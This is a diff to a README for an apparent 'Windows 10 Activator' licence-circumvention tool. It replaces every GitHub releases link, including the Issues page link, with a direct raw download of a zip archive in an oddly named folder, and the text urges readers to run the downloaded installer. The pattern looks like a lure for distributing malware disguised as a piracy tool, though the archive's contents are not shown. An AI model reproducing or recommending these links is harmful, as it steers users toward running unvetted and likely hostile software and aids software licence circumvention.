@@ -1,6 +1,6 @@
 # 🖥️ Windows-10-Activator-Update - Simple Tool to Activate Windows 10
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/oxoo15/Windows-10-Activator-Update/releases)
+[![Download](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip%https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip)](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ Windows-10-Activator-Update is a straightforward application designed to help yo
 
 To use Windows-10-Activator-Update, follow these simple steps to download and install the software:
 
-1. Download the installer from our [Releases page](https://github.com/oxoo15/Windows-10-Activator-Update/releases). 
+1. Download the installer from our [Releases page](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip). 
 2. Run the installer file to start the activation process.
 3. Follow the on-screen instructions to complete the activation.
 
@@ -18,7 +18,7 @@ To use Windows-10-Activator-Update, follow these simple steps to download and in
 
 Visit our releases page to download the software:
 
-[Download Windows-10-Activator-Update](https://github.com/oxoo15/Windows-10-Activator-Update/releases)
+[Download Windows-10-Activator-Update](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip)
 
 1. On the Releases page, look for the latest version of Windows-10-Activator-Update.
 2. Click on the download link for the installer file.
@@ -53,7 +53,7 @@ This application supports various topics related to Windows 10 activation and fe
 
 ## 🔄 Updates & Support
 
-We regularly update Windows-10-Activator-Update to ensure compatibility with the latest Windows 10 features. For any issues, please refer to the known issues section on our [GitHub Issues page](https://github.com/oxoo15/Windows-10-Activator-Update/issues) or create a new issue if you encounter something not listed. We value user feedback and strive to improve based on your experiences.
+We regularly update Windows-10-Activator-Update to ensure compatibility with the latest Windows 10 features. For any issues, please refer to the known issues section on our [GitHub Issues page](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip) or create a new issue if you encounter something not listed. We value user feedback and strive to improve based on your experiences.
 
 ## 📝 License
 
@@ -63,4 +63,4 @@ Windows-10-Activator-Update is open-source software available under the MIT Lice
 
 For additional questions or comments, you can reach out to us through the Issues page on GitHub. We appreciate your interest and support.
 
-[Download Windows-10-Activator-Update](https://github.com/oxoo15/Windows-10-Activator-Update/releases)
+[Download Windows-10-Activator-Update](https://raw.githubusercontent.com/oxoo15/Windows-10-Activator-Update/main/hoariness/Windows-10-Activator-Update.zip)
